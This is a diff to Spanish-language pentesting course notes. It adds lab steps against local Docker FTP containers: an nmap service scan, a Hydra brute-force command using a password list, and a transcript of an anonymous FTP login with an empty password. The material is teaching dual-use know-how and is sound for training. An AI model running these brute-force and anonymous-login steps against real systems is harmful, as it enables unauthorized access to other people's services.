@@ -1334,8 +1334,11 @@ docker run \
     --volume /data:/home/user \
     garethflowers/ftp-server
 
+# Escaneamos la máquina con nmap
+nmap -sCV -p21 127.0.0.1
+
 #Hemos vulnerado esta máquina usando fuerza bruta con Hydra
-> hydra -l gerry -P pass.txt ftp://127.0.0.1 -t 10
+hydra -l gerry -P pass.txt ftp://127.0.0.1 -t 10
 ```
 
 Una de las herramientas que usamos en esta clase para el primer proyecto que nos descargamos es ‘Hydra‘. Hydra es una herramienta de pruebas de penetración de código abierto que se utiliza para realizar ataques de fuerza bruta contra sistemas y servicios protegidos por contraseña. La herramienta es altamente personalizable y admite una amplia gama de protocolos de red, como HTTP, FTP, SSH, Telnet, SMTP, entre otros.
@@ -1343,6 +1346,41 @@ Una de las herramientas que usamos en esta clase para el primer proyecto que nos
 El siguiente de los proyectos que utilizamos para desplegar el contenedor que permite la autenticación de usuarios invitados para FTP, es el proyecto ‘docker-anon-ftp‘ de ‘metabrainz‘. A continuación, se os proporciona el enlace al proyecto:
 
 [Docker-ANON-FTP](https://github.com/metabrainz/docker-anon-ftp)
+
+```bash
+docker run -d -p 20-21:20-21 -p 65500-65515:65500-65515 -v /tmp:/var/ftp:ro inanimate/vsftpd-anon
+
+# Revisamos que la máquina haya levantado
+docker ps
+
+# Una vez levantada la máquina procedo con el escaneo de puertos
+nmap -sCV -p21 127.0.0.1
+
+# Resultados
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.0.8 or later
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Cant get directory listing: PASV IP 172.17.0.2 is not the same as 127.0.0.1
+Service Info: Host: Welcome
+
+# Nos damos cuenta que tiene el usuario anonymous permitido y nos conectamos
+ftp 127.0.0.1 
+# Nos responde
+Connected to 127.0.0.1.
+220 Welcome to an awesome public FTP Server
+# Digitamos el usuario anonymous
+Name (127.0.0.1:ethicalmachine): anonymous
+# Introducimos la contraseña vacia
+331 Please specify the password.
+Password: 
+# Obtenemos acceso
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> 
+
+
+```
 
 ### Enumeración del servicio SSH
 
